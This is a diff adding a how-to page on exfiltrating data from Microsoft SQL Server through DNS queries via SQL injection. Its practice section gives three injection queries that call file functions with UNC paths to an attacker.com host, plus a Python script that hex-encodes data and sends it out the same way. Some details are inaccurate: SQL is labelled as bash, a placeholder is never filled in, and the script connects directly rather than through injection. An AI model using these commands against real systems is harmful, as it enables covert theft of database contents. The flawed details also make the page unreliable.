@@ -1,0 +1,94 @@
+---
+title: 'MSSQL DNS Exfiltration: Techniques and Automation'
+description: Learn how to perform DNS exfiltration using MSSQL through SQL injection
+  and automation.
+keywords:
+- MSSQL DNS exfiltration
+- SQL injection
+- out-of-band data transfer
+- fn_xe_file_target_read_file
+- fn_get_audit_file
+- fn_trace_gettable
+- DNS tunneling
+- network traffic analysis
+---
+
+# MSSQL DNS Exfiltration
+
+## Context
+
+MSSQL DNS exfiltration involves leveraging Microsoft SQL Server to transfer data out-of-band through DNS queries. This technique is often used to exfiltrate sensitive information from systems where conventional data transfer methods are monitored or blocked. Understanding DNS protocol basics, SQL Server permissions, network traffic analysis, and SQL injection techniques in Microsoft SQL Server are essential for executing this attack.
+
+## Theory
+
+### DNS Exfiltration Mechanism
+
+DNS exfiltration involves encoding data within DNS queries and sending these queries to an attacker-controlled server. The attacker then decodes the data received from the DNS server. This technique is employed because DNS traffic is typically allowed to pass through network firewalls, making it a stealthy method for data exfiltration.
+
+### SQL Server Privileges for DNS Exfiltration
+
+Certain privileges on the SQL Server are required to execute functions capable of DNS exfiltration. Privileges such as `CONTROL SERVER` or `VIEW SERVER STATE` allow execution of commands that can trigger external DNS queries, thus enabling data exfiltration.
+
+### Functions Enabling DNS Exfiltration in MSSQL
+
+Functions like `fn_xe_file_target_read_file`, `fn_get_audit_file`, and `fn_trace_gettable` in MSSQL can be used to trigger DNS queries. These functions, when improperly secured, can be exploited to perform out-of-band data transfer using DNS queries to an external server.
+
+### DNS Tunneling Mechanisms
+
+DNS tunneling involves encapsulating data within DNS queries to bypass network restrictions. Since DNS is a protocol commonly allowed through firewalls, it can be exploited for stealthy data exfiltration. The weakness stems from the common practice of allowing DNS traffic to pass unfiltered through firewalls.
+
+## Practice
+
+### DNS Exfiltration via MSSQL SQL Injection
+
+To perform DNS exfiltration using SQL injection on MSSQL, the following steps are executed:
+
+- **Initiating a DNS Query using `fn_xe_file_target_read_file`:**
+
+    ```bash
+    SELECT * FROM fn_xe_file_target_read_file('\\attacker.com\%data%', NULL, NULL, NULL);
+    ```
+    This command triggers a DNS query to the attacker's server with encoded data.
+
+- **Using `fn_get_audit_file` for Exfiltration:**
+
+    ```bash
+    SELECT * FROM fn_get_audit_file('\\attacker.com\%data%', DEFAULT, DEFAULT);
+    ```
+    An alternative function to trigger a DNS query for data exfiltration.
+
+- **Employing `fn_trace_gettable` for DNS Query:**
+
+    ```bash
+    SELECT * FROM fn_trace_gettable('\\attacker.com\%data%', DEFAULT);
+    ```
+    This command initiates another method for DNS query-based data exfiltration.
+
+The outcome of these commands is the successful exfiltration of data through DNS queries to an attacker-controlled server.
+
+### Automated DNS Exfiltration Script
+
+For automating DNS exfiltration, the following Python script can be used:
+
+```python
+import pyodbc
+
+def encode_to_dns_format(data):
+    # Custom function to encode data suitable for DNS query
+    return data.encode('utf-8').hex()
+
+conn = pyodbc.connect('DRIVER={SQL Server};SERVER=server;DATABASE=db;UID=user;PWD=password')
+cursor = conn.cursor()
+data = 'sensitive_data'
+encoded_data = encode_to_dns_format(data)
+query = f"SELECT * FROM fn_xe_file_target_read_file('\\\\attacker.com\\{encoded_data}', NULL, NULL, NULL);"
+cursor.execute(query)
+conn.close()
+```
+
+This automated approach encodes the data into a format suitable for DNS queries and executes the SQL command to initiate the exfiltration process through encoded DNS queries.
+
+## Tools
+
+- **pyodbc**
+- **SQL Server Management Studio**
